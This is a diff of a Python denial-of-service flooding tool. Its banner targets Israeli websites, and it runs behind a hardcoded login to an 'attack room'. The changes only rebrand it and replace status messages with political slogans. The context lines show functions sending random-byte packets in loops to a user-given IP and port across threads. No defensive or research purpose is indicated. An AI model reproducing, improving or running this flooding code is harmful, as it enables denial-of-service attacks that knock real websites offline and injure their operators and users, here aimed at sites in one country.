@@ -51,7 +51,7 @@ print("\033[94m       @         @     @    @     @        @       @     @      \
 print("\033[94m        @ @ @    @     @    @     @        @       @     @      \033[0m")
 print("")
 print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—__\033[0m")
-print("\033[95m             WEBSITE ISRAEL TARGET ONLY                         \033[0m")
+print("\033[95m                WEBSITE ISRAEL TARGET ONLY                       \033[0m")
 print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")
 
 while attemps < 100:
@@ -59,7 +59,7 @@ while attemps < 100:
     password = input("\033[31mEnter your password: \033[0m")
 
     if username == 'ulan' and password == 'ulan':
-        print("\033[32m⟩⟩ Welcome to WULAN CAHYA ATTACK ROOM \033[0m")
+        print("\033[32m>>>>> Welcome to WULAN CAHYA ATTACK ROOM \033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -83,10 +83,10 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print("[+]  \033[32mTCP  \033[33mנפגע על ידי סערה מדברית\033[0m    " +ip+ "")
+			print("[+]  \033[32mTCP  \033[33mBIRRUH BIDDAM NAFDIKA YAA AQSHA\033[0m    " +ip+ "")
 			print("\033[35m—————————————————————————————————————————————————💥\033[0m")
 		except:
-			print("[-]  \033[31mMay be down\033[0m")
+			print("[-]  \033[31mFREE PALESTINE\033[0m")
 
 def run2():
 	data = random._urandom(999)
@@ -98,11 +98,11 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[*]  \033[96mUDP  \033[92mBlackPhanter-\033[95mattack Sent   \033[33m" +ip+ "\033[0m")
+			print("[*]  \033[96mUDP  \033[92mWulan Cahya-\033[95mattack Sent   \033[33m" +ip+ "\033[0m")
 			print("\033[36m—————————————————————————————————————————————————💥\033[0m")
 		except:
 			s.close()
-			print("[-]  \033[31mMay be down\033[0m")
+			print("[-]  \033[31mFREE PALESTINE\033[0m")
 
 
 def run3():
@@ -115,10 +115,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[+]  \033[94mAttack Sent!!!\033[0m")
+			print("[+]  \033[94mPacket Sent >>>\033[0m")
 		except:
 			s.close()
-			print("[-]  \033[31mMay be down\033[0m")
+			print("[-]  \033[31mFREE PALESTINE\033[0m")
 
 			
 for y in range(threads):
